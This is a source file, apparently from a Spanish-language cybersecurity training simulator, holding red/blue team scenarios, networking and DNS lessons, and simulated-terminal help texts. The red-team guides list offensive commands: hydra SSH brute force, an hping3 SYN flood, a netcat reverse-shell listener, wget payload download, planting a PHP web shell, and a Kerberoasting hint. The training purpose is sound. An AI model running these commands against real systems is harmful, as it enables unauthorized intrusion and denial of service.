        { id: 'blue-prevent-lateral', description: 'Prevenir/detectar el movimiento lateral hacia el DC-01', points: 15, required: true, validator: (env) => env.defenseProgress.blockedIPs.includes('10.10.0.20')},
    ],
    hints: [
        { trigger: (env) => env.timeline.filter(log => log.message.includes('kerberoast')).length > 0, message: '🚨 [EQUIPO AZUL] Múltiples solicitudes de tickets de servicio (TGS) para cuentas de servicio detectadas. ¡Posible Kerberoasting en progreso!' },
        { trigger: (env) => !env.attackProgress.credentials['svc_sql@10.10.0.5'], message: '💡 [EQUIPO ROJO] La cuenta svc_sql tiene un SPN. Es un objetivo ideal para Kerberoasting. Usa Rubeus o GetUserSPNs.py.' },
    ],
    evaluation: (env) => ({ completed: false, score: 0, feedback: [] })
};


export const TRAINING_SCENARIOS: (TrainingScenario | InteractiveScenario)[] = [
    {
        id: 'escenario1', icon: 'layers', color: 'bg-blue-500', title: 'Escenario 1: El Diagnóstico (OSI/TCP-IP)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Reciben dos tickets de soporte simultáneamente:</p>
                <ul>
                    <li><strong>Ticket A:</strong> Un usuario (<code>192.168.1.50</code>) se queja de que <code>http://intranet.cybervaltorix.local</code> (<code>10.10.30.5</code>) carga "extremadamente lento".</li>
                    <li><strong>Ticket B:</strong> Otro usuario (<code>192.168.1.52</code>) reporta que no puede acceder a <code>\\srv-files.cybervaltorix.local</code> (<code>10.10.40.10</code>). Un <code>ping</code> falla con "Destination Host Unreachable".</li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                 <p>Son Nivel 1. Aísles el problema desde su máquina Kali (<code>192.168.1.0/24</code>).</p>
                 <h4>Entregables</h4>
                 <ul>
                     <li><strong>Proceso de Diagnóstico:</strong> Pasos y comandos para ambos tickets.</li>
                     <li><strong>Aislamiento de Capa:</strong> ¿Qué capa (TCP/IP) es la sospechosa para el Ticket A? ¿Y para el Ticket B?</li>
                     <li><strong>Herramientas:</strong> ¿Qué comandos (<code>ping</code>, <code>traceroute</code>, etc.) usarían?</li>
                 </ul>
            </CisoCard>
        </div>
    },
     {
        id: 'escenario2', icon: 'shield-alert', color: 'bg-red-500', title: 'Escenario 2: El Vector de Ataque (DNS)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Monitoreando logs de firewall. El Resolver DNS interno es <code>172.16.10.5</code>. Una laptop (<code>172.16.20.100</code>) muestra tráfico anómalo:</p>
                <pre><code>... 172.16.20.100:34876 -&gt; 8.8.8.8:53 ... ALLOWED
... 172.16.20.100:34877 -&gt; 1.1.1.1:53 ... ALLOWED
... 172.16.20.100:41982 -&gt; 198.51.100.50:53 ... ALLOWED</code></pre>
                <p><code>198.51.100.50</code> es un resolver desconocido en Rusia. El tráfico es constante y las consultas parecen sin sentido (ej. <code>aHR0...com</code>).</p>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <ol>
                    <li>Analizar y explicar el evento.</li>
                    <li>Proponer contención inmediata (firewall).</li>
                </ol>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Análisis de Amenaza:</strong> ¿Riesgo? ¿Por qué es malo usar <code>8.8.8.8</code>? ¿Qué es el tráfico a <code>198.51.100.50</code>?</li>
                    <li><strong>Política de Contención:</strong> Escriba la política de firewall de egreso (Origen, Destino, Puerto) para neutralizar y prevenir esto.</li>
                    <li><strong>Simulación (Opcional):</strong> ¿Qué comando de Kali usaría para simular esta consulta anómala?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario3', icon: 'network', color: 'bg-green-500', title: 'Escenario 3: La Segmentación (Subnetting y ACLs)',
        subtitle: 'Tiempo Estimado: 20 minutos',
        content: <div className="grid md:grid-cols-2 gap-6">
            <CisoCard icon="clipboard-list" title="Situación">
                <p>Implementando política "Zero Trust" en el firewall que segmenta las subredes VLSM.</p>
                <h5>Las Zonas de Red:</h5>
                <ul>
                    <li><strong>Zona 1 (Invitados):</strong> <code>192.168.10.0/24</code></li>
                    <li><strong>Zona 2 (Corporativa):</strong> <code>192.168.20.0/25</code></li>
                    <li><strong>Zona 3 (Desarrollo):</strong> <code>192.168.20.128/26</code></li>
                    <li><strong>Zona 4 (Servidores):</strong> <code>192.168.30.0/27</code>
                        <ul className="ml-6 mt-1 text-sm">
                            <li><code>192.168.30.10</code> = Servidor Archivos (SMB, 445/TCP)</li>
                            <li><code>192.168.30.15</code> = Servidor BD (SQL, 1433/TCP)</li>
                        </ul>
                    </li>
                </ul>
            </CisoCard>
            <CisoCard icon="target" title="Su Tarea">
                <p>Definir la matriz de reglas de firewall (ACLs) que controla el tráfico <strong>entre</strong> estas zonas.</p>
                <h4>Entregables</h4>
                <ul>
                    <li><strong>Principio Rector:</strong> ¿Cuál es la <strong>primera</strong> regla que debe existir en cualquier política de firewall entre zonas?</li>
                    <li><strong>Matriz de ACLs:</strong> Defina qué tráfico está permitido/denegado. (Ej. ¿Zona 2 a Zona 4? ¿Zona 1 a cualquier otra?).</li>
                    <li><strong>Prueba de Verificación (Kali):</strong> ¿Qué comando usaría desde Zona 1 para <strong>probar</strong> que su bloqueo a Zona 4 es efectivo?</li>
                </ul>
            </CisoCard>
        </div>
    },
    {
        id: 'escenario4', icon: 'brain-circuit', color: 'bg-yellow-500', title: 'Escenario 4: Análisis de DNS, VLSM e Incidentes (Taller 2)',
        subtitle: 'Tiempo Estimado: 45 minutos',
        content: <>
            <CisoCard icon="book-copy" title="Sección 1: Fundamentos Operativos de DNS">
                <p>Responda las siguientes preguntas basándose en el material de recursos.</p>
                <ol>
                    <li><strong>El Gerente de Marketing:</strong> Un gerente le pregunta: "¿Qué es el DNS y por qué Tl habla tanto de él?" Explíquelo en términos sencillos, enfocándose en por qué es crítico para el negocio.</li>
                    <li><strong>El Arquitecto de Redes:</strong> Un gerente pregunta: "¿Por qué necesito abrir tanto UDP como TCP en el puerto 53? ¿No era DNS solo UDP?" Justifique la necesidad de ambos.</li>
                    <li><strong>Análisis de Proceso:</strong> Describa la diferencia fundamental entre una consulta DNS recursiva y una iterativa. ¿Cuál inicia su laptop y cuál realiza nuestro resolver interno?</li>
                </ol>
            </CisoCard>
            <CisoCard icon="shield-half" title="Sección 2: Escenarios de Ataque DNS">
                <ol start={4}>
                    <li><strong>Escenario (Pharming):</strong> Varios usuarios reportan que al escribir <code>www.nuestro-banco-asociado.com</code>, llegan a un sitio clonado que pide "verificar" su información. ¿Cuál es el ataque más probable? ¿El problema está en la laptop o en un servidor?</li>
                    <li><strong>Escenario (DDoS):</strong> El NOC reporta que nuestro servidor web está saturado por un volumen masivo de <strong>respuestas</strong> DNS anormalmente grandes. ¿Qué tipo de ataque DDoS es este? ¿Por qué el atacante usaría servidores de terceros?</li>
                    <li><strong>Mitigación Estratégica:</strong> El material menciona una tecnología con firmas criptográficas para proteger la integridad de las respuestas DNS. ¿Cómo se llama? ¿Cómo habría prevenido el ataque del Escenario 4?</li>
                </ol>
            </CisoCard>
        </>
    },
    {
        id: 'escenario5', icon: 'shield-off', color: 'bg-red-700', title: 'Escenario 5: "El Peor Día" (Recuperación de Control)',
        subtitle: 'Equipo Azul - Respuesta a Incidentes',
        content: <>
            <CisoCard icon="alert-octagon" title='Situación: 10. "El Peor Día"'>
                <p>Es lunes, 9:00 AM. Clientes reportan que nuestro sitio (<code>www.esit-pasantes.com</code>) es una página de phishing pidiendo tarjetas de crédito. TI confirma que no pueden iniciar sesión en <code>WEB-PROD-01</code>; sus contraseñas de admin y root han sido cambiadas. Han perdido el control.</p>
            </CisoCard>
            <CisoCard icon="shield" title="FASE A: CONTENCIÓN (Detener el fraude AHORA)">
                <p><strong>Menú de Herramientas/Acciones:</strong></p>
                <ol>
                    <li><strong>Firewall de Red (ACLs):</strong> Bloquear la IP del servidor <code>WEB-PROD-01</code>.</li>
                    <li><strong>Consola del Hipervisor (vSphere/Hyper-V):</strong> "Desconectar" la tarjeta de red virtual (vNIC) del servidor.</li>
                    <li><strong>Registrador de DNS Público:</strong> Cambiar el registro DNS <code>www.esit-pasantes.com</code> para que apunte a una IP de "página en mantenimiento".</li>
                    <li><strong>Desconectar el Servidor:</strong> Ir al data center y desconectar el cable físico.</li>
                </ol>
                 <h4>Su Tarea (A):</h4>
                 <p>Priorice las acciones del menú. ¿Cuál es la acción MÁS RÁPIDA y EFECTIVA para detener el fraude al cliente? ¿Por qué las otras opciones son peores o más lentas?</p>
            </CisoCard>
        </>
    },
    {
        id: 'escenario6', icon: 'swords', color: 'bg-purple-500', title: 'Escenario 6: "El Cazador" (Simulación de Equipo Rojo)',
        subtitle: 'Equipo Rojo - Pentesting',
        content: <>
             <CisoCard icon="user-check" title="Equipo y Misión">
                <p><strong>Equipo:</strong> Esta tarea es para el equipo de pentesting (Equipo Rojo). El Equipo Azul (resto de pasantes) estará en modo defensivo.</p>
                <p><strong>Misión:</strong> Su trabajo es causar el incidente del Escenario 5. Comprometer <code>WEB-PROD-01</code> (en sandbox), bloquear a los administradores y suplantar el sitio web.</p>
            </CisoCard>
             <CisoCard icon="binoculars" title="FASE 1: RECONOCIMIENTO Y ACCESO INICIAL">
                <p><strong>Objetivo:</strong> Encontrar una forma de entrar (ej. phishing a un admin).</p>
                <h4>Su Tarea (Fase 1):</h4>
                <p>Describan cómo identificarían a su objetivo y qué método de "Acceso Inicial" elegirían.</p>
            </CisoCard>
        </>
    },
    fortressScenario,
    rageScenario,
    killChainScenario,
    adEscalationScenario,
];

// FIX: Add missing RESOURCE_MODULES export
export const RESOURCE_MODULES: ResourceModule[] = [
    {
        id: 'fundamentos-red',
        icon: 'book-open',
        title: 'Fundamentos de Redes (Modelos OSI y TCP/IP)',
        content: (
            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="El Modelo OSI: La Teoría">
                    <p>El modelo OSI (Open Systems Interconnection) es un marco conceptual de 7 capas que estandariza las funciones de un sistema de telecomunicaciones o de computación sin tener en cuenta su estructura interna y tecnología subyacentes. Es una guía, no una implementación estricta.</p>
                    <ol>
                        <li><b>Capa Física:</b> Transmisión de bits. Cables, conectores, voltajes.</li>
                        <li><b>Capa de Enlace de Datos:</b> Direccionamiento físico (MAC). Tramas (Frames).</li>
                        <li><b>Capa de Red:</b> Direccionamiento lógico (IP) y enrutamiento. Paquetes.</li>
                        <li><b>Capa de Transporte:</b> Conexión extremo a extremo, fiabilidad (TCP) y velocidad (UDP). Segmentos/Datagramas.</li>
                        <li><b>Capa de Sesión:</b> Gestión de diálogos entre aplicaciones.</li>
                        <li><b>Capa de Presentación:</b> Formato de datos, cifrado, compresión.</li>
                        <li><b>Capa de Aplicación:</b> Protocolos de alto nivel (HTTP, FTP, SMTP).</li>
                    </ol>
                </CisoCard>
                <CisoCard title="El Modelo TCP/IP: La Práctica">
                    <p>El modelo TCP/IP es un modelo más práctico y condensado de 4 capas que es la base de Internet. Se enfoca en la implementación.</p>
                     <ol>
                        <li><b>Acceso a Red (Capas 1 y 2 de OSI):</b> Combina las capas Física y de Enlace. Se encarga de cómo los datos se envían físicamente a través de la red.</li>
                        <li><b>Internet (Capa 3 de OSI):</b> Equivalente a la Capa de Red. Direccionamiento IP y enrutamiento de paquetes.</li>
                        <li><b>Transporte (Capa 4 de OSI):</b> Equivalente a la Capa de Transporte. Protocolos TCP y UDP.</li>
                        <li><b>Aplicación (Capas 5, 6 y 7 de OSI):</b> Combina Sesión, Presentación y Aplicación. Protocolos como HTTP, DNS, FTP.</li>
                    </ol>
                </CisoCard>
            </div>
        )
    },
    {
        id: 'dns-profundo',
        icon: 'book-search',
        title: 'Guía Profunda de DNS',
        content: (
             <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="¿Qué es DNS?">
                    <p>El Sistema de Nombres de Dominio (DNS) es el servicio de directorio de Internet. Los humanos acceden a la información en línea a través de nombres de dominio, como <code>cybervaltorix.com</code>. Los navegadores web interactúan a través de direcciones de Protocolo de Internet (IP). DNS traduce los nombres de dominio a direcciones IP para que los navegadores puedan cargar los recursos de Internet.</p>
                </CisoCard>
                 <CisoCard title="Tipos de Consultas DNS">
                    <ul>
                        <li><b>Consulta Recursiva:</b> Un cliente DNS (como tu PC) le pide a un servidor DNS (el "resolver") que realice la resolución de nombres completa por él. El resolver hace todo el trabajo y devuelve la respuesta final o un error.</li>
                        <li><b>Consulta Iterativa:</b> El cliente DNS le pregunta a un servidor, y si este no tiene la respuesta, le devuelve una referencia a otro servidor DNS "más autoritativo" al que preguntar. El cliente debe entonces repetir la consulta a ese nuevo servidor. Este proceso continúa hasta que se encuentra un servidor autoritativo que puede dar la respuesta final.</li>
                    </ul>
                </CisoCard>
                 <CisoCard title="DNS y Seguridad (Vectores de Ataque)">
                    <ul>
                        <li><b>Envenenamiento de Caché / Spoofing:</b> Un atacante introduce datos DNS falsos en la caché de un resolver, haciendo que los usuarios sean redirigidos a sitios maliciosos.</li>
                        <li><b>DNS Tunneling:</b> Usar DNS para exfiltrar datos o para establecer un canal de Comando y Control (C2). Las consultas DNS se disfrazan para llevar cargas útiles maliciosas.</li>
                        <li><b>Ataques de Amplificación DNS:</b> Un tipo de DDoS donde un atacante envía pequeñas consultas DNS a servidores públicos con una dirección IP de origen falsificada (la de la víctima). Los servidores responden con respuestas mucho más grandes a la víctima, abrumando sus recursos.</li>
                        <li><b>DNSSEC (Domain Name System Security Extensions):</b> Mitiga el envenenamiento de caché al agregar firmas criptográficas a los registros DNS para verificar su autenticidad.</li>
                    </ul>
                </CisoCard>
            </div>
        )
    },
    {
        id: 'subnetting-vlsm',
        icon: 'network',
        title: 'Subnetting y VLSM',
        content: (
            <div className="prose prose-invert prose-sm max-w-none prose-p:my-2 prose-ul:my-2 prose-ol:my-2 prose-pre:my-2 prose-code:text-amber-300 prose-code:bg-black/30 prose-code:p-1 prose-code:rounded-md prose-code:font-mono prose-code:before:content-none prose-code:after:content-none">
                <CisoCard title="Subnetting: Dividir para Vencer">
                    <p>Subnetting es el proceso de tomar una red grande y dividirla en múltiples redes más pequeñas o subredes. Esto se hace para mejorar la seguridad, la organización y el rendimiento de la red, y para conservar las direcciones IP.</p>
                    <p>La <b>Máscara de Subred</b> (ej. <code>255.255.255.0</code> o <code>/24</code>) es lo que define qué parte de una dirección IP pertenece a la red (NetID) y qué parte al dispositivo (HostID).</p>
                </CisoCard>
                 <CisoCard title="VLSM: Máscara de Subred de Longitud Variable">
                    <p>VLSM es una técnica más eficiente de subnetting. En lugar de dividir una red en subredes del mismo tamaño, VLSM permite crear subredes de diferentes tamaños a partir de la misma red base. Esto es extremadamente útil para minimizar el desperdicio de direcciones IP.</p>
                    <p><b>Ejemplo Práctico:</b> Tienes el bloque <code>192.168.0.0/24</code> (254 hosts). Necesitas:</p>
                    <ul>
                        <li>Una red para 100 PCs.</li>
                        <li>Una red para 50 PCs.</li>
                        <li>Una red para 10 servidores.</li>
                        <li>Enlaces punto a punto de 2 IPs cada uno.</li>
                    </ul>
                    <p>Con subnetting tradicional, podrías crear 4 subredes de 62 hosts cada una (<code>/26</code>), desperdiciando muchas IPs. Con VLSM, puedes crear subredes de tamaño preciso (<code>/25</code> para 126 hosts, <code>/26</code> para 62 hosts, <code>/28</code> para 14 hosts, <code>/30</code> para 2 hosts), optimizando el uso del espacio de direccionamiento.</p>
                </CisoCard>
            </div>
        )
    },
];

// Terminal Help Text
export const GENERAL_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">Bienvenido a la terminal de simulación.
Use 'help' para comandos de equipo, o 'help [id_escenario]' para guías.
Ej: <strong class="text-amber-300">help escenario7</strong>

  clear                    - Limpia la pantalla de la terminal.
  marca                    - Muestra la marca de Cyber Valtorix.
  exit                     - Cierra una sesión SSH simulada.
</pre>`;

export const RED_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Reconocimiento</strong>
  <strong class="text-amber-300">nmap [opciones] [host]</strong>    - Escanea puertos y servicios.
  <strong class="text-amber-300">dirb http://[host]</strong>       - Busca directorios web ocultos.
  <strong class="text-amber-300">curl http://[host]/[file]</strong> - Intenta leer archivos sensibles.
  <strong class="text-amber-300">nikto -h http://[host]</strong>   - Escáner de vulnerabilidades web.
  <strong class="text-amber-300">ping [host]</strong>              - Verifica conectividad.

<strong>Fase 2: Intrusión y Explotación</strong>
  <strong class="text-amber-300">hydra -l [user] -P [file] ssh://[host]</strong> - Lanza ataque de fuerza bruta. <strong class="text-red-500">(¡RUIDOSO!)</strong>
  <strong class="text-amber-300">hping3 --flood -S [host]</strong> - Lanza un ataque de denegación de servicio (DoS).
  <strong class="text-amber-300">john [hash_file]</strong>       - Simula cracking de contraseñas offline.
  <strong class="text-amber-300">ssh [user]@[host]</strong>      - Intenta acceder con credenciales encontradas.
  <strong class="text-amber-300">wget [url]</strong>             - (Dentro del host) Descarga un 'payload'.
  <strong class="text-amber-300">nc -lvnp [port]</strong>        - Crea un listener para reverse shells.

<strong>Fase 3: Post-Explotación</strong>
  <strong class="text-amber-300">ls -la</strong>                 - Lista archivos y permisos.
  <strong class="text-amber-300">cat [file]</strong>               - Muestra contenido de un archivo.
  <strong class="text-amber-300">ps aux</strong>                 - Muestra procesos en ejecución.
  <strong class="text-amber-300">whoami</strong>                 - Muestra el usuario actual.
</pre>`;

export const BLUE_TEAM_HELP_TEXT = `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL - OBJETIVOS Y COMANDOS</strong>
Use <strong class="text-amber-300">help [id]</strong> para una guía detallada (ej. help escenario8).

<strong>Fase 1: Conexión y Hardening</strong>
  <strong class="text-amber-300">ssh blue-team@[host]</strong>     - Conéctese al servidor para asegurarlo.
  <strong class="text-amber-300">sudo ufw [cmd]</strong>           - Gestiona el firewall (status, enable, allow, deny).
  <strong class="text-amber-300">sudo nano [file]</strong>         - Simula editar un archivo de configuración.
  <strong class="text-amber-300">sudo systemctl restart [svc]</strong>- Aplica los cambios a un servicio (ej. sshd).
  <strong class="text-amber-300">ls -l [file]</strong>             - Lista permisos de archivos.
  <strong class="text-amber-300">sudo chmod [perm] [file]</strong>   - Cambia permisos de archivos.

<strong>Fase 2: Monitoreo y Detección</strong>
  <strong class="text-amber-300">top</strong> / <strong class="text-amber-300">htop</strong>               - Muestra la carga del sistema (Detectar DoS).
  <strong class="text-amber-300">sudo ss -tulnp</strong>               - Muestra servicios escuchando en puertos.
  <strong class="text-amber-300">grep "Failed" /var/log/auth.log</strong> - Busca intentos de login fallidos.
  <strong class="text-amber-300">journalctl -u sshd</strong>       - Revisa logs del servicio SSH.
  <strong class="text-amber-300">tail -f [file]</strong>           - Monitorea logs en tiempo real.

<strong>Fase 3: Respuesta a Incidentes</strong>
  <strong class="text-amber-300">fail2ban-client banip [ip]</strong> - Simula un baneo manual de IP.
  <strong class="text-amber-300">sha256sum [file]</strong>           - Verifica la integridad de un archivo.
</pre>`;

export const SCENARIO_HELP_TEXTS: { [key: string]: { general: string, red: string, blue: string } } = {
  'escenario7': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 7: Fortaleza Digital</strong>
Este es un ejercicio práctico de ataque y defensa en tiempo real contra <strong class="text-cyan-300">BOVEDA-WEB</strong>.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'BOVEDA-WEB'</strong>
Tu misión es asegurar el servidor ANTES de que el Equipo Rojo encuentre una vulnerabilidad.
El orden es crítico.

1.  <strong>Activar Firewall (UFW):</strong> Es tu primera línea de defensa.
    <strong class="text-amber-300">sudo ufw status</strong>      (Verifica que está inactivo)
    <strong class="text-amber-300">sudo ufw allow 22/tcp</strong>  (¡CRÍTICO! SSH primero o te quedarás fuera)
    <strong class="text-amber-300">sudo ufw allow 80/tcp</strong>  (HTTP)
    <strong class="text-amber-300">sudo ufw allow 443/tcp</strong> (HTTPS)
    <strong class="text-amber-300">sudo ufw enable</strong>        (¡Actívalo!)

2.  <strong>Asegurar SSH:</strong> Deshabilita el login directo de 'root'.
    <strong class="text-amber-300">sudo nano /etc/ssh/sshd_config</strong>  (Cambia PermitRootLogin a 'no')
    <strong class="text-amber-300">sudo systemctl restart sshd</strong> (Aplica los cambios)

3.  <strong>Principio de Menor Privilegio:</strong> Protege archivos sensibles.
    <strong class="text-amber-300">ls -l /var/www/html/db_config.php</strong> (Verás permisos 644 inseguros)
    <strong class="text-amber-300">sudo chmod 640 /var/www/html/db_config.php</strong>  (Solo dueño/grupo leen)

4.  <strong>Monitoreo Activo:</strong> Caza al Equipo Rojo.
    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Monitoreo en tiempo real de ataques SSH)
</pre>`,
    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es encontrar una ventana de oportunidad antes de que el Equipo Azul la cierre.

1.  <strong>Reconocimiento:</strong> ¿Qué está abierto?
    <strong class="text-amber-300">nmap -sV -sC BOVEDA-WEB</strong> (Busca puertos abiertos como 3306 MySQL)

2.  <strong>Enumeración Web:</strong>
    <strong class="text-amber-300">dirb http://BOVEDA-WEB</strong>     (Busca /backup)
    <strong class="text-amber-300">curl http://BOVEDA-WEB/backup/db_config.php.bak</strong> (¡Info leak!)

3.  <strong>Ataque de Fuerza Bruta:</strong>
    <strong class="text-amber-300">hydra -l root -P wordlist.txt ssh://BOVEDA-WEB</strong> (Solo si root login está activo)

4.  <strong>Persistencia:</strong>
    Si logras entrar: <strong class="text-amber-300">ssh root@BOVEDA-WEB</strong>
    Modifica el índice: <strong class="text-amber-300">nano /var/www/html/index.php</strong>
</pre>`
  },
 'escenario8': {
    general: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-yellow-300">GUÍA DETALLADA - ESCENARIO 8: Furia en la Red</strong>
Ataque combinado contra <strong class="text-cyan-300">PORTAL-WEB</strong>. El trabajo en equipo y la velocidad son claves.
</pre>`,
    blue: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-blue-400">EQUIPO AZUL (DEFENSOR) - EN TERMINAL 'PORTAL-WEB'</strong>
Estás bajo un doble ataque. Debes diagnosticar y mitigar ambas amenazas.

1.  <strong>Diagnóstico Inicial:</strong> ¿Qué está pasando?
    <strong class="text-amber-300">top</strong>                 (Verás CPU al 99%. Significa DoS).
    <strong class="text-amber-300">netstat -an | grep ':80'</strong> (Verifica conexiones masivas).
    <strong class="text-amber-300">tail -f /var/log/auth.log</strong> (Busca "Failed password". Eso es bruteforce).

2.  <strong>Mitigación Inmediata:</strong> ¡Detén el sangrado!
    <strong class="text-amber-300">sudo ufw deny from 192.168.1.100</strong> (Bloquea la IP atacante).
    Esto detendrá AMBOS ataques simultáneamente.

3.  <strong>Análisis Post-Incidente:</strong> ¿Lograron entrar?
    <strong class="text-amber-300">who</strong> o <strong class="text-amber-300">w</strong> (Revisa usuarios conectados).
    <strong class="text-amber-300">sha256sum /var/www/html/index.php</strong> (Verifica integridad del archivo).
</pre>`,
    red: `<pre class="whitespace-pre-wrap font-mono text-xs">
<strong class="text-red-400">EQUIPO ROJO (ATACANTE) - EN TERMINAL 'soc-valtorix'</strong>
Tu misión es multifacética: distraer, infiltrar y desplegar.

1.  <strong>Fase de Distracción (DoS):</strong> Crea caos.
    <strong class="text-amber-300">hping3 --flood -S -p 80 PORTAL-WEB</strong> (Satura el servidor. CPU al 100%).

2.  <strong>Fase de Infiltración (Fuerza Bruta):</strong>
    Mientras el DoS corre (es una distracción), lanza el ataque real:
    <strong class="text-amber-300">hydra -l admin -P wordlist.txt ssh://PORTAL-WEB</strong>

3.  <strong>Acceso y Persistencia:</strong>
    Si obtienes la contraseña antes del bloqueo:
    <strong class="text-amber-300">ssh admin@PORTAL-WEB</strong>
    Instala backdoor: <strong class="text-amber-300">cat > /var/www/html/shell.php</strong>
</pre>`
 }
};

export const ALL_COMMANDS = [
    'help', 'nmap', 'hydra', 'nc', 'msfconsole', 'clear', 'marca', 'exit', 
    'ssh', 'sudo', 'ufw', 'ls', 'whoami', 'ping', 'dirb', 'curl', 'nikto',
    'john', 'wget', 'cat', 'ps', 'systemctl', 'chmod', 'nano', 'grep', 'top', 'htop', 'ss',
    'journalctl', 'openssl', 'fail2ban-client', 'sha256sum', 'hping3', 'tail', 'netstat'
];
